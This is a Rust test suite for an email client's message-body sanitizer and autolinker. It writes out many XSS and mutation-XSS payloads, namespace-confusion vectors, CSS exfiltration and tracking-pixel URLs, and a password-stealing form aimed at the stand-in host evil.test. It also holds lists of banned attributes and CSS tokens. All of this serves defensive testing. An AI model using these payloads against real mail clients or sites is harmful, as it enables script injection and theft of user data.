//! Security tests for the message-body renderer.
//!
//! This is a security boundary: everything fed to these functions was written
//! by a stranger who wants to read the user's mail. The tests are written as
//! attacks, not as examples.

use mach_lib::render::quotes::{self, Split};
use mach_lib::render::sanitize::{sanitize_fragment, text_to_html};
use mach_lib::render::{render_html, render_html_with, render_text, RenderOptions};

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

fn clean(html: &str) -> String {
    sanitize_fragment(html, false).0
}

/// Elements the renderer is allowed to emit. Written out here rather than
/// imported so that widening the sanitizer's allowlist has to be a deliberate
/// two-place edit.
const EXPECTED_ELEMENTS: &[&str] = &[
    "a", "abbr", "acronym", "address", "area", "b", "bdi", "bdo", "big", "blockquote", "br",
    "caption", "center", "cite", "code", "col", "colgroup", "dd", "del", "dfn", "dir", "div", "dl",
    "dt", "em", "figcaption", "figure", "font", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "i",
    "img", "ins", "kbd", "label", "legend", "li", "main", "mark", "nobr", "ol", "p", "pre", "q",
    "rp", "rt", "ruby", "s", "samp", "section", "small", "span", "strike", "strong", "sub", "sup",
    "table", "tbody", "td", "tfoot", "th", "thead", "time", "tr", "tt", "u", "ul", "var", "wbr",
];

/// Attribute names that must never reach the WebView, regardless of value.
const BANNED_ATTRIBUTES: &[&str] = &[
    "action", "archive", "background", "class", "classid", "codebase", "data", "dynsrc",
    "formaction", "id", "longdesc", "lowsrc", "manifest", "name", "ping", "poster", "profile",
    "srcdoc", "srcset", "usemap", "xlink:href",
];

struct Tag {
    name: String,
    attrs: Vec<(String, String)>,
}

/// Scan the *structure* of the output rather than grepping its text.
///
/// Grepping cannot tell `onerror=` in a live attribute from `onerror=` sitting
/// harmlessly inside an escaped `title="&lt;img onerror=...&gt;"`, and treating
/// the second as a failure would push the sanitizer into mangling ordinary
/// text. So parse instead, and make claims about elements and attributes.
///
/// Attribute values are quoted and `"`-escaped in the serializer's output, so
/// this scanner sees exactly what a browser would.
fn parse_tags(html: &str) -> Vec<Tag> {
    let b = html.as_bytes();
    let mut tags = Vec::new();
    let mut i = 0usize;
    while i < b.len() {
        if b[i] != b'<' {
            i += 1;
            continue;
        }
        i += 1;
        if i < b.len() && b[i] == b'/' {
            i += 1;
        }
        let start = i;
        while i < b.len() && (b[i].is_ascii_alphanumeric() || b[i] == b'-' || b[i] == b':') {
            i += 1;
        }
        let name = html[start..i].to_ascii_lowercase();
        if name.is_empty() {
            // A raw `<` in text position. The serializer escapes those, so this
            // is itself a bug; surface it as an unnamed element.
            tags.push(Tag { name: "<raw-lt>".into(), attrs: Vec::new() });
            continue;
        }
        let mut attrs = Vec::new();
        loop {
            while i < b.len() && b[i].is_ascii_whitespace() {
                i += 1;
            }
            if i >= b.len() || b[i] == b'>' {
                i += 1;
                break;
            }
            if b[i] == b'/' {
                i += 1;
                continue;
            }
            let ns = i;
            while i < b.len()
                && !b[i].is_ascii_whitespace()
                && b[i] != b'='
                && b[i] != b'>'
                && b[i] != b'/'
            {
                i += 1;
            }
            let aname = html[ns..i].to_ascii_lowercase();
            let mut value = String::new();
            while i < b.len() && b[i].is_ascii_whitespace() {
                i += 1;
            }
            if i < b.len() && b[i] == b'=' {
                i += 1;
                while i < b.len() && b[i].is_ascii_whitespace() {
                    i += 1;
                }
                if i < b.len() && (b[i] == b'"' || b[i] == b'\'') {
                    let quote = b[i];
                    i += 1;
                    let vs = i;
                    while i < b.len() && b[i] != quote {
                        i += 1;
                    }
                    value = html[vs..i].to_string();
                    i += 1;
                } else {
                    let vs = i;
                    while i < b.len() && !b[i].is_ascii_whitespace() && b[i] != b'>' {
                        i += 1;
                    }
                    value = html[vs..i].to_string();
                }
            }
            if !aname.is_empty() {
                attrs.push((aname, value));
            }
        }
        tags.push(Tag { name, attrs });
    }
    tags
}

fn assert_inert(out: &str) {
    for tag in parse_tags(out) {
        assert!(
            EXPECTED_ELEMENTS.contains(&tag.name.as_str()),
            "unexpected element <{}> in output\n---\n{out}\n---",
            tag.name
        );
        for (name, value) in &tag.attrs {
            assert!(
                !name.starts_with("on"),
                "event handler {name}= survived\n---\n{out}\n---"
            );
            assert!(
                !BANNED_ATTRIBUTES.contains(&name.as_str()),
                "{name}= survived\n---\n{out}\n---"
            );
            assert!(
                !name.starts_with("data-")
                    || name == "data-mach-blocked-src"
                    || name == "data-mach-cid"
                    || name == "data-mach-tracker",
                "unexpected data attribute {name}=\n---\n{out}\n---"
            );
            match name.as_str() {
                "style" => assert_inert_css(value, out),
                "href" | "src" | "data-mach-blocked-src" => assert_safe_url(name, value, out),
                _ => {}
            }
        }
    }
}

fn assert_inert_css(value: &str, out: &str) {
    let low = value.to_ascii_lowercase();
    for bad in [
        "url(",
        "expression",
        "@",
        "\\",
        "/*",
        "behavior",
        "binding",
        "javascript",
        "vbscript",
        "position:",
        "z-index",
        "transform",
        "opacity",
        "visibility",
        "clip-path",
        "pointer-events",
        "mix-blend-mode",
    ] {
        assert!(
            !low.contains(bad),
            "style attribute still contains {bad:?}: {value:?}\n---\n{out}\n---"
        );
    }
}

fn assert_safe_url(attr: &str, value: &str, out: &str) {
    let value = value.replace("&amp;", "&").trim().to_ascii_lowercase();
    let scheme = value.split_once(':').map(|(s, _)| s.to_string());
    match scheme.as_deref() {
        Some("http") | Some("https") | Some("mailto") | Some("tel") => {}
        Some("data") => assert!(
            value.starts_with("data:image/")
                && !value.contains("svg")
                && value.contains(";base64,"),
            "unsafe data: url in {attr}=: {value}\n---\n{out}\n---"
        ),
        Some(other) => panic!("scheme {other:?} in {attr}=\n---\n{out}\n---"),
        None => panic!("relative url in {attr}=: {value:?}\n---\n{out}\n---"),
    }
}

/// Every mention of `host` in the output must sit behind
/// `data-mach-blocked-src=`, i.e. there must be no way for the WebView to fetch
/// it without the user opting in.
fn assert_no_loadable_remote(out: &str, host: &str) {
    let mut at = 0usize;
    while let Some(rel) = out[at..].find(host) {
        let i = at + rel;
        at = i + 1;
        // Walk back to the attribute this mention sits in and name it.
        let before = &out[..i];
        let opener = before.rfind("=\"").expect("host mentioned outside an attribute");
        let name_start = before[..opener]
            .rfind(|c: char| c.is_ascii_whitespace() || c == '<')
            .map(|p| p + 1)
            .unwrap_or(0);
        let attr = &before[name_start..opener];
        assert_eq!(
            attr, "data-mach-blocked-src",
            "{host} is reachable through {attr}=\n---\n{out}\n---"
        );
    }
}

// ===========================================================================
// 1. Baseline script vectors
// ===========================================================================

#[test]
fn script_tag_and_its_contents_are_removed() {
    let out = clean("<p>hi</p><script>alert(document.cookie)</script><p>bye</p>");
    assert_inert(&out);
    // The script *body* must not survive as text either.
    assert!(!out.contains("alert"), "script body leaked as text: {out}");
    assert!(out.contains("hi") && out.contains("bye"));
}

#[test]
fn event_handler_attributes_are_stripped() {
    for vector in [
        r#"<img src="https://e.test/a.png" onerror="alert(1)">"#,
        r#"<img src=x onerror=alert(1)>"#,
        r#"<img src=x OnErRoR=alert(1)>"#,
        r#"<div onmouseover="alert(1)">hover</div>"#,
        r#"<body onload="alert(1)">x</body>"#,
        r#"<p onfocus=alert(1) tabindex=1>x</p>"#,
        r#"<img src=x onerror
        =alert(1)>"#,
        // Entity-encoded handler name; html5ever does not decode attribute
        // *names*, but prove it anyway.
        r#"<img src=x &#111;nerror=alert(1)>"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        assert!(
            !out.to_ascii_lowercase().contains("alert(1)"),
            "handler survived for {vector:?}: {out}"
        );
    }
}

#[test]
fn javascript_urls_are_neutralized() {
    for vector in [
        r#"<a href="javascript:alert(1)">x</a>"#,
        r#"<a href="JaVaScRiPt:alert(1)">x</a>"#,
        r#"<a href=" javascript:alert(1)">x</a>"#,
        // Tab/newline/NUL inside the scheme: the URL parser strips these, so a
        // naive string comparison would miss it.
        "<a href=\"java\tscript:alert(1)\">x</a>",
        "<a href=\"java\nscript:alert(1)\">x</a>",
        "<a href=\"java\u{0}script:alert(1)\">x</a>",
        r#"<a href="&#106;avascript:alert(1)">x</a>"#,
        r#"<a href="&#x6a;avascript:alert(1)">x</a>"#,
        r#"<a href="vbscript:msgbox(1)">x</a>"#,
        r#"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>"#,
        r#"<a href="data:text/html,<script>alert(1)</script>">x</a>"#,
        r#"<a href="blob:https://evil.test/abc">x</a>"#,
        r#"<a href="file:///etc/passwd">x</a>"#,
        r#"<a href="about:blank">x</a>"#,
        r#"<a href="cid:not-a-link">x</a>"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        assert!(
            !out.contains("href="),
            "dangerous href survived for {vector:?}: {out}"
        );
        assert!(out.contains('x'), "link text was eaten for {vector:?}");
    }
}

#[test]
fn safe_link_schemes_survive_with_opener_protection() {
    for (vector, expect) in [
        (r#"<a href="https://ok.test/a?b=1&c=2">x</a>"#, "https://ok.test/a?b=1&amp;c=2"),
        (r#"<a href="http://ok.test/">x</a>"#, "http://ok.test/"),
        (r#"<a href="mailto:a@b.test">x</a>"#, "mailto:a@b.test"),
        (r#"<a href="tel:+15551234">x</a>"#, "tel:+15551234"),
    ] {
        let out = clean(vector);
        assert!(out.contains(expect), "href mangled for {vector:?}: {out}");
        assert!(
            out.contains(r#"rel="noopener noreferrer"#),
            "missing rel for {vector:?}: {out}"
        );
        assert!(
            out.contains(r#"target="_blank""#),
            "missing target for {vector:?}: {out}"
        );
    }
}

#[test]
fn attacker_supplied_target_and_rel_cannot_win() {
    // window.opener abuse: attacker asks for a named target and no rel.
    let out = clean(r#"<a href="https://evil.test/" target="mach" rel="opener">x</a>"#);
    assert!(!out.contains(r#"target="mach""#), "{out}");
    assert!(!out.contains(r#"rel="opener""#), "{out}");
    assert_eq!(out.matches("rel=").count(), 1, "duplicate rel: {out}");
    assert_eq!(out.matches("target=").count(), 1, "duplicate target: {out}");
    assert!(out.contains(r#"rel="noopener noreferrer"#), "{out}");
}

// ===========================================================================
// 2. Namespace confusion / SVG / MathML
// ===========================================================================

#[test]
fn svg_script_vectors_are_removed() {
    for vector in [
        r#"<svg><script>alert(1)</script></svg>"#,
        r#"<svg><script href="data:text/javascript,alert(1)"/></svg>"#,
        r#"<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>"#,
        r#"<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>"#,
        r#"<svg><set attributeName="href" to="javascript:alert(1)"/></svg>"#,
        r#"<svg><foreignObject><iframe src="https://evil.test"></iframe></foreignObject></svg>"#,
        r#"<svg><use href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"/></svg>"#,
        r#"<svg><image href="https://tracker.test/p.gif"/></svg>"#,
        r#"<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">"#,
        r#"<img src="data:image/svg+xml,<svg onload=alert(1)></svg>">"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        assert!(
            !out.to_ascii_lowercase().contains("alert(1)"),
            "svg vector survived {vector:?}: {out}"
        );
        assert!(
            !out.contains("tracker.test"),
            "svg image loaded remotely {vector:?}: {out}"
        );
        assert!(
            !out.contains("svg+xml"),
            "svg data uri survived {vector:?}: {out}"
        );
    }
}

#[test]
fn namespace_confusion_does_not_reparse_into_script() {
    // The classic ammonia/DOMPurify namespace-confusion family: content parsed
    // in a foreign namespace is serialized back into the HTML namespace where
    // it re-parses differently.
    for vector in [
        r#"<svg><iframe><a title="</iframe><img src=x onerror=alert(1)>">test"#,
        r#"<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=x onerror=alert(1)>">"#,
        r#"<math><annotation-xml encoding="text/html"><iframe><a title="</iframe><img src=x onerror=alert(1)>">"#,
        r#"<svg></p><style><a id="</style><img src=x onerror=alert(1)>">"#,
        r#"<math><mtext><h1><style><!--</style><img title="--><img src=x onerror=alert(1)>">"#,
        r#"<svg><textarea><title></textarea><img src=x onerror=alert(1)>"#,
        r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>">"#,
        r#"<svg><xmp><!--</xmp><img src=x onerror=alert(1)>-->"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        // Re-sanitizing the output must be a fixed point. If it is not, the
        // output re-parses into something different, i.e. mutation XSS.
        let twice = clean(&out);
        assert_eq!(
            clean(&twice),
            twice,
            "sanitizer is not idempotent for {vector:?}\nonce: {out}\ntwice: {twice}"
        );
    }
}

#[test]
fn mutation_xss_from_unbalanced_markup() {
    for vector in [
        r#"<p title="</p><img src=x onerror=alert(1)>">"#,
        r#"<div><div><div><p>unclosed"#,
        r#"</div></div></p></span>stray closers<b>"#,
        r#"<b><i>overlapping</b></i>"#,
        r#"<a href="https://ok.test/"><a href="javascript:alert(1)">nested</a></a>"#,
        r#"<table><td><p>orphan cell"#,
        r#"<!-- <img src=x onerror=alert(1)> -->"#,
        r#"<![CDATA[<img src=x onerror=alert(1)>]]>"#,
        r#"<?xml-stylesheet ><img src=x onerror="alert(1)"> ?>"#,
        r#"<svg><?xml-stylesheet ><img src=x onerror="alert(1)"> ?></svg>"#,
        "<p>text</p\u{0}><img src=x onerror=alert(1)>",
    ] {
        let out = clean(vector);
        assert_inert(&out);
        let twice = clean(&out);
        assert_eq!(
            clean(&twice),
            twice,
            "not idempotent for {vector:?}\nonce: {out}\ntwice: {twice}"
        );
    }
}

#[test]
fn comments_are_stripped_including_outlook_conditionals() {
    let out = clean(
        r#"<!--[if gte mso 9]><xml><o:OfficeDocumentSettings></o:OfficeDocumentSettings></xml><![endif]-->
           <!--[if mso]><style>a{behavior:url(#default#AnchorClick)}</style><![endif]-->
           <p>real content</p>"#,
    );
    assert_inert(&out);
    assert!(!out.contains("<!--"), "comment survived: {out}");
    assert!(!out.contains("OfficeDocumentSettings"), "{out}");
    assert!(out.contains("real content"));
}

// ===========================================================================
// 3. Structural elements that must be gone
// ===========================================================================

#[test]
fn iframe_is_removed() {
    let out = clean(r#"<p>a</p><iframe src="https://evil.test/x" srcdoc="<script>alert(1)</script>"></iframe><p>b</p>"#);
    assert_inert(&out);
    assert!(!out.contains("evil.test"), "{out}");
    assert!(out.contains('a') && out.contains('b'));
}

#[test]
fn form_posting_to_external_host_is_removed() {
    let out = clean(
        r#"<form action="https://evil.test/steal" method="post">
             <input type="password" name="p">
             <input type="hidden" name="h" value="secret">
             <textarea name="t">x</textarea>
             <select name="s"><option>a</option></select>
             <button formaction="https://evil.test/steal2">Send</button>
           </form>"#,
    );
    assert_inert(&out);
    assert!(!out.contains("evil.test"), "form action survived: {out}");
    assert!(!out.contains("secret"), "hidden value survived: {out}");
}

#[test]
fn head_elements_are_removed() {
    let out = clean(
        r#"<base href="https://evil.test/">
           <link rel="stylesheet" href="https://evil.test/x.css">
           <meta http-equiv="refresh" content="0;url=https://evil.test/">
           <style>@import url(https://evil.test/x.css); body{background:url(https://evil.test/p.gif)}</style>
           <p>content</p>"#,
    );
    assert_inert(&out);
    assert!(!out.contains("evil.test"), "{out}");
    assert!(out.contains("content"));
}

// ===========================================================================
// 4. CSS exfiltration
// ===========================================================================

#[test]
fn css_cannot_load_remote_resources() {
    for vector in [
        r#"<div style="background-image:url(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="background:#fff url('http://evil.test/p.gif') no-repeat">x</div>"#,
        r#"<div style="list-style-image:url(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="border-image:url(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="content:url(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="cursor:url(http://evil.test/c.cur),auto">x</div>"#,
        r#"<div style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://evil.test/p.gif')">x</div>"#,
        r#"<div style="background:-webkit-image-set(url(http://evil.test/p.gif) 1x)">x</div>"#,
        // CSS escapes hiding the url() token.
        r#"<div style="background:\75 rl(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="background:u\72 l(http://evil.test/p.gif)">x</div>"#,
        // Comment splitting.
        r#"<div style="background:ur/**/l(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="color:red;/*x*/background-image:url(http://evil.test/p.gif)">x</div>"#,
        // Property-name escapes.
        r#"<div style="\62 ackground-image:url(http://evil.test/p.gif)">x</div>"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        assert!(
            !out.contains("evil.test"),
            "css fetched a remote resource for {vector:?}: {out}"
        );
        assert!(out.contains('x'), "content eaten for {vector:?}");
    }
}

#[test]
fn css_expression_and_import_and_binding_are_removed() {
    for vector in [
        r#"<div style="width:expression(alert(1))">x</div>"#,
        r#"<div style="width:expr/**/ession(alert(1))">x</div>"#,
        r#"<div style="@import 'http://evil.test/x.css';color:red">x</div>"#,
        r#"<div style="-moz-binding:url(http://evil.test/x.xml#xss)">x</div>"#,
        r#"<div style="behavior:url(#default#time2)">x</div>"#,
        r#"<div style="color:red;} body{background:url(http://evil.test/p.gif)};">x</div>"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        assert!(!out.contains("evil.test"), "{vector:?}: {out}");
        assert!(!out.to_ascii_lowercase().contains("alert(1)"), "{vector:?}: {out}");
    }
}

#[test]
fn css_cannot_escape_its_container() {
    for prop in [
        "position:fixed;top:0;left:0;width:100vw;height:100vh",
        "position:absolute;top:-9999px",
        "position:sticky;top:0",
        "z-index:2147483647",
        "transform:translate(-9999px,0)",
        "opacity:0",
        "visibility:hidden",
        "pointer-events:none",
        "clip-path:inset(50%)",
        "mix-blend-mode:difference",
    ] {
        let vector = format!(r#"<div style="{prop}">x</div>"#);
        let out = clean(&vector);
        let low = out.to_ascii_lowercase();
        for banned in [
            "position",
            "z-index",
            "transform",
            "opacity",
            "visibility",
            "pointer-events",
            "clip-path",
            "mix-blend-mode",
        ] {
            assert!(
                !low.contains(banned),
                "layout-escaping property {banned:?} survived from {prop:?}: {out}"
            );
        }
    }
}

#[test]
fn html_entities_cannot_smuggle_css_tokens() {
    // The parser decodes entities in attribute values before the sanitizer sees
    // them, so a scrubber that ran on the raw source would miss these.
    for vector in [
        r#"<div style="background:&#117;rl(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="background:&#x75;rl(http://evil.test/p.gif)">x</div>"#,
        r#"<div style="width:&#101;xpression(alert(1))">x</div>"#,
        r#"<div style="&#64;import 'http://evil.test/x.css'">x</div>"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        assert!(!out.contains("evil.test"), "{vector:?}: {out}");
        assert!(!out.to_ascii_lowercase().contains("alert(1)"), "{vector:?}: {out}");
    }
}

#[test]
fn quotes_inside_an_image_url_cannot_reopen_the_attribute() {
    // The blocked/CID rewrite is a post-pass over the serializer's output, so
    // it must not be fooled by a value that contains what looks like a closing
    // quote. Beyond that, whatever ends up stored in data-mach-blocked-src is
    // handed back to the UI on "load images", so it must not contain a quote at
    // all — not even an escaped one — in case the UI interpolates it.
    for vector in [
        r#"<img src='https://evil.test/a" onerror="alert(1)'>"#,
        r#"<img src='https://evil.test/a"><script>alert(1)</script>'>"#,
        r#"<img src='https://evil.test/a" data-mach-cid="forged'>"#,
        r#"<img src="https://evil.test/a%22%20onerror=%22alert(1)">"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        assert_eq!(
            out.matches('"').count(),
            2 * out.matches("=\"").count(),
            "smuggled quote for {vector:?}: {out}"
        );
        assert!(!out.contains("&quot;"), "raw quote stored for {vector:?}: {out}");
        assert!(!out.contains('\''), "raw apostrophe stored for {vector:?}: {out}");
        assert_no_loadable_remote(&out, "evil.test");
    }
}

#[test]
fn malformed_content_ids_are_rejected() {
    // A Content-ID is an addr-spec. Anything else is either unresolvable or an
    // attempt to smuggle text into whatever looks the attachment up.
    for vector in [
        r#"<img src='cid:logo" onerror="alert(1)'>"#,
        r#"<img src='cid:logo"><script>alert(1)</script>'>"#,
        r#"<img src="cid:../../../etc/passwd">"#,
        r#"<img src="cid:">"#,
    ] {
        let r = render_html(vector);
        assert_inert(&r.html);
        assert_eq!(r.inline_cid_images, 0, "accepted a bad cid for {vector:?}: {r:#?}");
        assert!(!r.html.contains("data-mach-cid"), "{vector:?}: {}", r.html);
    }
    // ...while a normal one still works.
    let r = render_html(r#"<img src="cid:part1.a0b1@mail.example.com">"#);
    assert_eq!(r.inline_cid_images, 1, "{r:#?}");
    assert!(r.html.contains(r#"data-mach-cid="part1.a0b1@mail.example.com""#), "{}", r.html);
    // Angle-bracketed form, which is how the Content-ID header itself is written.
    let r = render_html(r#"<img src="cid:&lt;part1@mail.example.com&gt;">"#);
    assert_eq!(r.inline_cid_images, 1, "{r:#?}");
    assert!(r.html.contains(r#"data-mach-cid="part1@mail.example.com""#), "{}", r.html);
}

#[test]
fn benign_inline_styles_survive() {
    let out = clean(
        r#"<p style="COLOR: #333; font-family:'Helvetica Neue',Arial,sans-serif; font-size:14px; text-align:center; padding:12px 0 !important">hello</p>"#,
    );
    assert!(out.contains("color"), "color was dropped: {out}");
    assert!(out.contains("14px"), "font-size was dropped: {out}");
    assert!(out.contains("center"), "text-align was dropped: {out}");
    assert!(out.contains("hello"));
}

// ===========================================================================
// 5. Remote images / tracking pixels
// ===========================================================================

#[test]
fn remote_images_are_blocked_and_counted() {
    let body = r#"<p>hi</p>
        <img src="https://tracker.test/open.gif?u=abc" width="1" height="1" alt="">
        <img src="http://cdn.test/logo.png" alt="Logo" width="200">"#;
    let r = render_html(body);

    assert_eq!(r.blocked_remote_images, 2, "{:#?}", r);
    // The original URLs are preserved for the "load images" affordance...
    assert!(r.html.contains(r#"data-mach-blocked-src="https://tracker.test/open.gif?u=abc""#), "{}", r.html);
    assert!(r.html.contains(r#"data-mach-blocked-src="http://cdn.test/logo.png""#), "{}", r.html);
    // ...but nothing loadable points at them.
    assert_no_loadable_remote(&r.html, "tracker.test");
    assert_no_loadable_remote(&r.html, "cdn.test");
    // Alt text and layout hints are kept so the placeholder is not a surprise.
    assert!(r.html.contains(r#"alt="Logo""#), "{}", r.html);
    assert!(r.html.contains(r#"width="200""#), "{}", r.html);
}

#[test]
fn images_load_when_the_user_opts_in() {
    let body = r#"<img src="https://cdn.test/logo.png" alt="Logo">"#;
    let r = render_html_with(body, RenderOptions { allow_remote_images: true });
    assert!(r.html.contains(r#"src="https://cdn.test/logo.png""#), "{}", r.html);
    assert!(!r.html.contains("data-mach-blocked-src"), "{}", r.html);
    // Opting into images must not opt into anything else.
    let r = render_html_with(
        r#"<img src="https://cdn.test/l.png" onerror="alert(1)"><script>alert(1)</script>"#,
        RenderOptions { allow_remote_images: true },
    );
    assert_inert(&r.html);
}

#[test]
fn attacker_cannot_forge_mach_data_attributes() {
    // If attacker-supplied data-mach-* attributes survived, an attacker could
    // pre-arm the "load images" affordance with a URL of their choosing, or
    // confuse the CID resolver into reading another message's attachment.
    let out = clean(
        r#"<img src="https://a.test/x.png" data-mach-blocked-src="https://evil.test/x" data-mach-cid="other">
           <div data-mach-blocked="1" data-mach-cid="stolen">x</div>"#,
    );
    assert!(!out.contains("evil.test"), "{out}");
    assert!(!out.contains("other"), "{out}");
    assert!(!out.contains("stolen"), "{out}");
    assert_eq!(out.matches("data-mach-blocked-src").count(), 1, "{out}");
}

#[test]
fn cid_images_are_handled_separately_from_remote_ones() {
    let r = render_html(r#"<img src="cid:logo@mach.local" alt="Logo">"#);
    assert_eq!(r.blocked_remote_images, 0, "CID counted as remote: {r:#?}");
    assert_eq!(r.inline_cid_images, 1, "{r:#?}");
    assert!(r.html.contains(r#"data-mach-cid="logo@mach.local""#), "{}", r.html);
    // A raw cid: src is useless to the WebView and must not be left behind.
    assert!(!r.html.contains(r#"src="cid:"#), "{}", r.html);
}

#[test]
fn safe_data_image_uris_are_allowed_dangerous_ones_are_not() {
    // 1x1 transparent GIF — no network, no script, keep it.
    let gif = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
    let r = render_html(&format!(r#"<img src="{gif}" alt="dot">"#));
    assert!(r.html.contains(gif), "safe data image dropped: {}", r.html);
    assert_eq!(r.inline_data_images, 1, "{r:#?}");
    assert_eq!(r.blocked_remote_images, 0, "{r:#?}");

    for bad in [
        "data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+",
        "data:image/svg+xml,<svg/onload=alert(1)>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/html,<script>alert(1)</script>",
        "data:application/xhtml+xml;base64,AAAA",
        "data:image/png,<script>alert(1)</script>",
        "DATA:TEXT/HTML,<script>alert(1)</script>",
        "data:image/png;base64,PHN2Zz48c2NyaXB0Pg==\" onerror=\"alert(1)",
    ] {
        let out = clean(&format!(r#"<img src="{bad}">"#));
        assert_inert(&out);
        assert!(
            !out.contains("data:text/html") && !out.contains("svg+xml"),
            "dangerous data uri survived {bad:?}: {out}"
        );
    }
}

#[test]
fn other_remote_fetch_vectors_are_gone() {
    for vector in [
        r#"<td background="https://tracker.test/p.gif">x</td>"#,
        r#"<table background="https://tracker.test/p.gif"><tr><td>x</td></tr></table>"#,
        r#"<body background="https://tracker.test/p.gif">x</body>"#,
        r#"<img srcset="https://tracker.test/p.gif 1x" src="https://tracker.test/q.gif">"#,
        r#"<picture><source srcset="https://tracker.test/p.gif"><img src="https://tracker.test/q.gif"></picture>"#,
        r#"<video poster="https://tracker.test/p.gif"></video>"#,
        r#"<input type="image" src="https://tracker.test/p.gif">"#,
        r#"<object data="https://tracker.test/p.gif"></object>"#,
        r#"<a href="https://ok.test/" ping="https://tracker.test/ping">x</a>"#,
        r#"<img lowsrc="https://tracker.test/p.gif" dynsrc="https://tracker.test/p.gif">"#,
    ] {
        let out = clean(vector);
        assert_inert(&out);
        // An <img src> legitimately becomes a blocked, non-loadable reference.
        // Everything else here must leave no trace of the host at all.
        assert_no_loadable_remote(&out, "tracker.test");
    }
}

#[test]
fn relative_urls_do_not_resolve_against_the_app_origin() {
    let out = clean(
        r#"<img src="/../../etc/passwd"><a href="/settings">x</a><img src="p.gif">"#,
    );
    assert!(!out.contains("etc/passwd"), "{out}");
    assert!(!out.contains(r#"href="/settings""#), "{out}");
    assert!(!out.contains(r#"src="p.gif""#), "{out}");
}

// ===========================================================================
// 6. Autolinker — must not become the injection it is trying to prevent
// ===========================================================================

#[test]
fn plain_text_is_escaped() {
    let out = text_to_html("<script>alert(1)</script> & <b>bold</b> \"q\" 'a'");
    assert_inert(&out);
    assert!(out.contains("&lt;script&gt;"), "{out}");
    assert!(out.contains("&amp;"), "{out}");
    assert!(!out.contains("<b>"), "{out}");
}

#[test]
fn plain_text_preserves_line_structure() {
    let r = render_text("line one\nline two\r\nline three");
    assert_eq!(r.html.matches("<br>").count(), 2, "{}", r.html);
    assert!(r.html.contains("line one") && r.html.contains("line three"));
    assert!(!r.html.contains('\r'), "raw CR leaked: {}", r.html);
}

#[test]
fn autolinker_cannot_be_tricked_into_emitting_javascript() {
    for vector in [
        "javascript:alert(1)",
        "JAVASCRIPT:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
        "file:///etc/passwd",
        "about:blank",
        // Look like a link but are not http(s).
        "httpx://evil.test/",
        "xhttp://evil.test/",
        "notaurl://evil.test/",
    ] {
        let out = text_to_html(vector);
        assert_inert(&out);
        assert!(
            !out.contains("<a "),
            "autolinker created a link for {vector:?}: {out}"
        );
    }
}

#[test]
fn autolinker_cannot_break_out_of_the_href_attribute() {
    for vector in [
        r#"http://ok.test/" onmouseover="alert(1)"#,
        r#"http://ok.test/"><script>alert(1)</script>"#,
        r#"http://ok.test/'onmouseover='alert(1)"#,
        r#"http://ok.test/<img src=x onerror=alert(1)>"#,
        "http://ok.test/\u{0}\" onload=\"alert(1)",
        r#"http://ok.test/&quot;onmouseover=&quot;alert(1)"#,
        // A javascript: URL hidden behind a legitimate-looking prefix.
        r#"http://ok.test/#javascript:alert(1)"#,
        r#"www.ok.test/"onmouseover="alert(1)"#,
    ] {
        let out = text_to_html(vector);
        assert_inert(&out);
        // Every raw quote in the output must be one of the two delimiters of an
        // attribute we opened ourselves. If the attacker smuggled a quote
        // through, this count goes odd or exceeds the attribute count.
        assert_eq!(
            out.matches('"').count(),
            2 * out.matches("=\"").count(),
            "smuggled quote for {vector:?}: {out}"
        );
    }
}

#[test]
fn autolinker_links_real_urls() {
    let out = text_to_html("see https://ok.test/a?b=1&c=2 and www.ok.test plus a@b.test done");
    assert!(out.contains(r#"href="https://ok.test/a?b=1&amp;c=2""#), "{out}");
    assert!(out.contains(r#"href="https://www.ok.test"#), "{out}");
    assert!(out.contains(r#"href="mailto:a@b.test""#), "{out}");
    assert!(out.contains(r#"rel="noopener noreferrer"#), "{out}");
    assert!(out.contains("done"), "trailing text lost: {out}");
    // Trailing sentence punctuation is not part of the URL.
    let out = text_to_html("go to https://ok.test/page.");
    assert!(out.contains(r#"href="https://ok.test/page""#), "{out}");
    assert!(out.ends_with('.') || out.contains(">.</"), "{out}");
}

#[test]
fn autolinker_does_not_link_inside_an_existing_link_text() {
    // Angle-bracketed URLs are common in plain-text mail.
    let out = text_to_html("<https://ok.test/x>");
    assert_inert(&out);
    assert!(out.contains("&lt;"), "{out}");
    assert_eq!(out.matches("<a ").count(), 1, "{out}");
}

// ===========================================================================
// 7. Quote detection
// ===========================================================================

fn assert_split(s: &Split, new_must_have: &[&str], quoted_must_have: &[&str]) {
    let quoted = s.quoted.as_deref().unwrap_or_default();
    for n in new_must_have {
        assert!(s.new.contains(n), "new content lost {n:?}\nnew: {}\nquoted: {quoted}", s.new);
